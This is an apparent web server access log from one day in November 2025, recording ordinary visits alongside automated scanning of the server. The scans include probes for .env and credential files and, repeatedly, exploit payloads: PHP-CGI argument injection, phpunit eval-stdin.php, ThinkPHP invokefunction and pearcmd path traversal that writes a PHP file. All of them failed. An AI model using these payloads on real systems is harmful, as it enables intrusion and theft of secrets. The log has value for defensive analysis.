[27/Nov/2025:05:04:42 +0000] 404 - GET http 64.225.63.240 "/tmp/config/.env" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36" "-"
[27/Nov/2025:05:04:43 +0000] 404 - GET http 64.225.63.240 "/symfony/env.yml" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 OPR/44.0.0.251023979 (Edition EXP135)" "-"
[27/Nov/2025:05:04:44 +0000] 404 - GET http 64.225.63.240 "/user_panel/.env" [Client 78.153.140.177] [Length 150] [Gzip -] "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 ( .NET CLR 3.5.30729)" "-"
[27/Nov/2025:05:04:44 +0000] 404 - GET http 64.225.63.240 "/symfony/env.php" [Client 78.153.140.177] [Length 150] [Gzip -] "More Firefox 2.0.0.3 user agents strings -->>" "-"
[27/Nov/2025:05:04:45 +0000] 404 - GET http 64.225.63.240 "/users/.env.dist" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (Linux; Android 5.1.1; Alcatel_4060A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36" "-"
[27/Nov/2025:05:04:46 +0000] 404 - GET http 64.225.63.240 "/server/.env.tmp" [Client 78.153.140.177] [Length 150] [Gzip -] "Opera/9.80 (X11; Linux zvav; U; sv) Presto/2.12.423 Version/12.16" "-"
[27/Nov/2025:05:04:47 +0000] 404 - GET http 64.225.63.240 "/test/.env.admin" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/31.0.1650.63 Safari/537.36" "-"
[27/Nov/2025:05:04:48 +0000] 404 - GET http 64.225.63.240 "/prestashop/.env" [Client 78.153.140.177] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0" "-"
[27/Nov/2025:05:04:51 +0000] 404 - GET http 64.225.63.240 "/server/.env.uat" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36" "-"
[27/Nov/2025:05:04:57 +0000] 404 - GET http 64.225.63.240 "/var/aws/ses.env" [Client 78.153.140.177] [Length 150] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:38.0) Gecko/20100101 Firefox/38.0" "-"
[27/Nov/2025:05:05:00 +0000] 404 - GET http 64.225.63.240 "/server/.env.bak" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36" "-"
[27/Nov/2025:05:05:04 +0000] 404 - GET http 64.225.63.240 "/v1/.env.example" [Client 78.153.140.177] [Length 150] [Gzip -] "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.01" "-"
[27/Nov/2025:05:05:10 +0000] 404 - GET http 64.225.63.240 "/spring/env.json" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.43 Safari/534.24" "-"
[27/Nov/2025:05:05:14 +0000] 404 - GET http 64.225.63.240 "/server/.env.old" [Client 78.153.140.177] [Length 150] [Gzip -] "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; fr-fr) AppleWebKit/531.9 (KHTML, like Gecko) Version/4.0.3 Safari/531.9" "-"
[27/Nov/2025:05:05:14 +0000] 404 - GET http 64.225.63.240 "/upload/.env.uat" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; chromeframe/32.0.1700.107; GTB7.5; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; WinNT-EVI 12.01.2010; MS-RTC LM 8; .NET CLR 2.0.50727; lib/5.0\x5C0195; Engine/4.00195; 89670803)" "-"
[27/Nov/2025:05:05:15 +0000] 404 - GET http 64.225.63.240 "/set_env_vars.sh" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (Linux; Android 4.4.2; SM-N900 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" "-"
[27/Nov/2025:05:05:16 +0000] 404 - GET http 64.225.63.240 "/prod/config.env" [Client 78.153.140.177] [Length 150] [Gzip -] "Opera/9.10 (Windows NT 6.0; U; it-IT)" "-"
[27/Nov/2025:05:05:16 +0000] 404 - GET http 64.225.63.240 "/tmp/secrets.env" [Client 78.153.140.177] [Length 150] [Gzip -] "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; SM-T211 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30" "-"
[27/Nov/2025:05:05:16 +0000] 404 - GET http 64.225.63.240 "/upload/.env.tmp" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36" "-"
[27/Nov/2025:05:05:17 +0000] 404 - GET http 64.225.63.240 "/upload/.env.pem" [Client 78.153.140.177] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 5.1; rv:54.0) Gecko/20100101 Firefox/54.0" "-"
[27/Nov/2025:05:05:17 +0000] 404 - GET http 64.225.63.240 "/var/aws/sns.env" [Client 78.153.140.177] [Length 150] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/6.1.6 Safari/537.78.2" "-"
[27/Nov/2025:05:05:18 +0000] 404 - GET http 64.225.63.240 "/upload/.env.old" [Client 78.153.140.177] [Length 150] [Gzip -] "Opera/9.80 (Windows NT 6.1) Presto/2.12.388 Version/12.11" "-"
[27/Nov/2025:05:05:18 +0000] 404 - GET http 64.225.63.240 "/server/.env.pem" [Client 78.153.140.177] [Length 552] [Gzip -] "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch; MALNJS)" "-"
[27/Nov/2025:05:09:06 +0000] 404 - GET http swifthvacandrefrigeration.com "/robots.txt" [Client 119.28.101.51] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" "-"
[27/Nov/2025:05:12:12 +0000] 200 - GET http 64.225.63.240 "/" [Client 87.236.176.45] [Length 568] [Gzip 1.86] "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)" "-"
[27/Nov/2025:05:18:02 +0000] 200 - GET http www.bhbuilders.org "/" [Client 182.42.105.144] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[27/Nov/2025:05:26:34 +0000] 404 - GET http www.swifthvacandrefrigeration.com "/.env" [Client 181.41.206.148] [Length 122] [Gzip 1.35] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" "-"
[27/Nov/2025:05:27:58 +0000] 200 - GET http 64.225.63.240 "/" [Client 149.100.11.243] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" "-"
[27/Nov/2025:05:50:42 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 34.147.11.95] [Length 0] [Gzip -] "-" "-"
[27/Nov/2025:05:51:33 +0000] 200 - GET http swifthvacandrefrigeration.com "/" [Client 20.13.26.97] [Length 1033] [Gzip -] "-" "-"
[27/Nov/2025:05:51:33 +0000] 404 - GET http swifthvacandrefrigeration.com "/wordpress" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:33 +0000] 404 - GET http swifthvacandrefrigeration.com "/wp-admin/setup-config.php" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:33 +0000] 404 - GET http swifthvacandrefrigeration.com "/wp-admin/install.php" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:33 +0000] 404 - GET http swifthvacandrefrigeration.com "/wp" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:33 +0000] 404 - GET http swifthvacandrefrigeration.com "/blog" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/new" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/old" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/newsite" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/test" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/main" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/testing" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/site" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/backup" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:34 +0000] 404 - GET http swifthvacandrefrigeration.com "/demo" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:35 +0000] 404 - GET http swifthvacandrefrigeration.com "/home" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:35 +0000] 404 - GET http swifthvacandrefrigeration.com "/tmp" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:35 +0000] 404 - GET http swifthvacandrefrigeration.com "/dev" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:35 +0000] 404 - GET http swifthvacandrefrigeration.com "/cms" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:35 +0000] 404 - GET http swifthvacandrefrigeration.com "/portal" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:05:51:35 +0000] 404 - GET http swifthvacandrefrigeration.com "/web" [Client 20.13.26.97] [Length 150] [Gzip -] "-" "-"
[27/Nov/2025:06:08:14 +0000] 404 - GET http swifthvacandrefrigeration.com "//wp-content/plugins/fix/up.php" [Client 91.92.240.63] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36" "-"
[27/Nov/2025:06:09:20 +0000] 400 - GET http localhost-nginx-proxy-manager "/" [Client 185.189.182.234] [Length 154] [Gzip -] "-" "-"
[27/Nov/2025:06:12:48 +0000] 200 - GET http swifthvacandrefrigeration.com "/" [Client 4.239.248.87] [Length 1033] [Gzip -] "-" "-"
[27/Nov/2025:06:22:47 +0000] 200 - GET http 64.225.63.240 "/" [Client 204.76.203.212] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[27/Nov/2025:06:23:10 +0000] 200 - GET http swifthvacandrefrigeration.com "/" [Client 192.248.56.1] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0" "-"
[27/Nov/2025:06:27:15 +0000] 400 - GET http 64.225.63.240 "/" [Client 192.159.99.101] [Length 252] [Gzip -] "-" "-"
[27/Nov/2025:06:30:04 +0000] 200 - GET http 64.225.63.240 "/" [Client 5.187.35.21] [Length 1033] [Gzip -] "-" "-"
[27/Nov/2025:06:44:38 +0000] 200 - GET http swifthvacandrefrigeration.com "/" [Client 101.33.80.42] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[27/Nov/2025:06:45:58 +0000] 200 - GET http www.swifthvacandrefrigeration.com "/" [Client 43.166.1.243] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[27/Nov/2025:06:57:22 +0000] 200 - GET http 64.225.63.240 "/" [Client 113.170.215.106] [Length 1033] [Gzip -] "-" "-"
[27/Nov/2025:07:20:36 +0000] 200 - GET http swifthvacandrefrigeration.com "/" [Client 213.209.143.137] [Length 1033] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0" "-"
[27/Nov/2025:07:31:03 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 173.224.125.59] [Length 154] [Gzip -] "-" "-"
[27/Nov/2025:07:31:03 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 173.224.125.59] [Length 154] [Gzip -] "-" "-"
[27/Nov/2025:07:31:03 +0000] 404 - POST http 64.225.63.240 "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:04 +0000] 405 - POST http 64.225.63.240 "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" [Client 173.224.125.59] [Length 154] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:04 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:04 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:04 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:05 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:05 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/phpunit/LICENSE/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:05 +0000] 404 - GET http 64.225.63.240 "/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:06 +0000] 404 - GET http 64.225.63.240 "/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:06 +0000] 404 - GET http 64.225.63.240 "/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:06 +0000] 404 - GET http 64.225.63.240 "/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:06 +0000] 404 - GET http 64.225.63.240 "/phpunit/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:06 +0000] 404 - GET http 64.225.63.240 "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:07 +0000] 404 - GET http 64.225.63.240 "/lib/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:07 +0000] 404 - GET http 64.225.63.240 "/lib/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:07 +0000] 404 - GET http 64.225.63.240 "/lib/phpunit/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:07 +0000] 404 - GET http 64.225.63.240 "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:08 +0000] 404 - GET http 64.225.63.240 "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:08 +0000] 404 - GET http 64.225.63.240 "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:08 +0000] 404 - GET http 64.225.63.240 "/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:08 +0000] 404 - GET http 64.225.63.240 "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:08 +0000] 404 - GET http 64.225.63.240 "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:09 +0000] 404 - GET http 64.225.63.240 "/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:09 +0000] 404 - GET http 64.225.63.240 "/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:09 +0000] 404 - GET http 64.225.63.240 "/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:09 +0000] 404 - GET http 64.225.63.240 "/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:10 +0000] 404 - GET http 64.225.63.240 "/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:11 +0000] 404 - GET http 64.225.63.240 "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:11 +0000] 404 - GET http 64.225.63.240 "/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:11 +0000] 404 - GET http 64.225.63.240 "/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:11 +0000] 403 - GET http 64.225.63.240 "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:11 +0000] 403 - GET http 64.225.63.240 "/index.php?lang=../../../../../../../../tmp/index1" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:31:11 +0000] 404 - GET http 64.225.63.240 "/containers/json" [Client 173.224.125.59] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:07:35:51 +0000] 200 - GET http swifthvacandrefrigeration.com "/" [Client 108.165.238.186] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" "-"
[27/Nov/2025:07:45:14 +0000] 400 - GET http 64.225.63.240 "/" [Client 43.153.104.196] [Length 252] [Gzip -] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[27/Nov/2025:07:46:06 +0000] 200 - GET http 64.225.63.240 "/" [Client 204.76.203.212] [Length 568] [Gzip 1.86] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
[27/Nov/2025:07:49:08 +0000] 200 - GET http www.swifthvacandrefrigeration.com "/" [Client 66.249.66.68] [Length 568] [Gzip 1.86] "GoogleBot/2.1" "-"
[27/Nov/2025:08:02:44 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 93.174.93.12] [Length 154] [Gzip -] "-" "-"
[27/Nov/2025:08:08:51 +0000] 200 - GET http www.swifthvacandrefrigeration.com "/" [Client 124.226.222.66] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[27/Nov/2025:08:09:56 +0000] 200 - GET http 64.225.63.240 "/" [Client 45.38.44.221] [Length 1033] [Gzip -] "-" "-"
[27/Nov/2025:08:20:15 +0000] 404 - GET http 64.225.63.240 "/version" [Client 40.71.98.94] [Length 150] [Gzip -] "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1" "-"
[27/Nov/2025:08:28:54 +0000] 404 - GET http swifthvacandrefrigeration.com "/robots.txt" [Client 173.252.82.16] [Length 150] [Gzip -] "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
[27/Nov/2025:08:30:38 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 38.244.38.53] [Length 154] [Gzip -] "-" "-"
[27/Nov/2025:08:30:39 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 38.244.38.53] [Length 154] [Gzip -] "-" "-"
[27/Nov/2025:08:30:39 +0000] 404 - POST http 64.225.63.240 "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" [Client 38.244.38.53] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:08:30:39 +0000] 405 - POST http 64.225.63.240 "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" [Client 38.244.38.53] [Length 154] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:08:30:40 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 38.244.38.53] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:08:30:40 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 38.244.38.53] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:08:30:40 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/src/Util/PHP/eval-stdin.php" [Client 38.244.38.53] [Length 150] [Gzip -] "libredtail-http" "-"
[27/Nov/2025:08:30:41 +0000] 404 - GET http 64.225.63.240 "/vendor/phpunit/Util/PHP/eval-stdin.php" [Client 38.244.38.53] [Length 150] [Gzip -] "libredtail-http" "-"
